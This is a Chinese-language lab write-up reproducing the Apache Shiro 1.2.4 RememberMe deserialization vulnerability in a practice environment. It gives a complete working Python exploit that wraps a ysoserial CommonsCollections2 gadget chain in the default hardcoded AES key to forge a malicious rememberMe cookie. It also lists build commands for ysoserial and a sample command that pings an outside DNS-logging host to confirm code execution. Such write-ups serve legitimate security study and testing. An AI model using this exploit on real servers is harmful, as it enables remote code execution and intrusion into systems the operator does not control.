**Shiro RememberMe 1.2.4 反序列化漏洞详细复现**

medicean/vulapps

描述: medicean/vulapps

题目居然没给cve是啥

只好用xray扫一下= = 

![image-20211029211307392](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20211029211307392.png)

# 

dns检测

![image-20211029211647313](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20211029211647313.png)

**问题：java反序列化到底是个啥？直接payload说是回到dnslog回显。没了  也没有植入命令栏？**

**那我怎么渗透进去？**

**还是说payload是固定的改不了了  要改的话得重新利用yso啥的构造payload，操作很多，导致这个工具只能使用这一个payload，需要其他插件，才能修改payload。所以这个只起到poc的作用，我猜是这样子的**



手动方法：

1、生成payload的脚本

将下面的脚本保存至本地命名为shiro_poc.py，然后进入linux系统/tmp目录下（如想使用其他KEY，替换脚本中的即可）

不要使用vi/vim命令创建文件再粘贴过去，粘贴会破坏代码的布局格式

命令行输入rz回车，就会跳出文件上传的页面（如果报错，pip安装一下），选择文件上传即可

```
# pip install pycrypto
import sys
import base64
import uuid
from random import Random
import subprocess
from Crypto.Cipher import AES

def encode_rememberme(command):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.5-SNAPSHOT-all.jar', 'CommonsCollections2', command], stdout=subprocess.PIPE)
    BS   = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key  =  "kPH+bIxk5D2deZiIxcaaaA=="
    mode =  AES.MODE_CBC
    iv   =  uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

if __name__ == '__main__':
    payload = encode_rememberme(sys.argv[1])    
    with open("/tmp/payload.cookie", "w") as fpw:
        print("rememberMe={}".format(payload.decode()), file=fpw)
```

 2、安装模块

脚本使用的是python3，安装模块时要使用pip3 install 模块名

其中有一个模块需要强调，就是安装pycrypto，用来解决报错No module named Crypto.Cipher

```
pip3 install pycrypto
```

3、ysoserial的jar文件

依次执行以下命令（jar的文件名要和脚本中的一样，文件要和脚本在同一目录下）

```
git　clone https://github.com/frohoff/ysoserial.git
cd ysoserial
mvn package -DskipTests
cp target/ysoserial-0.0.5-SNAPSHOT-all.jar /tmp
```

## 0x03 复现过程

在脚本后面输入你想要执行的命令，例：

```
python3 shiro_poc.py "ping fkl2af.ceye.io"
```

然后便会在脚本所在目录下生成文件payload.cookie

![img](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C1579317-20190806234329231-1111194173.png)

 

浏览器打开漏洞环境并登陆进去，点击account page抓包

![img](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C1579317-20190806234508067-1658933664.png)

 

用payload.cookie中内容替换Cookie中的全部内容，Go

![img](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C1579317-20190806234910125-2015955755.png)

 

到ceye平台查看即可到流量记录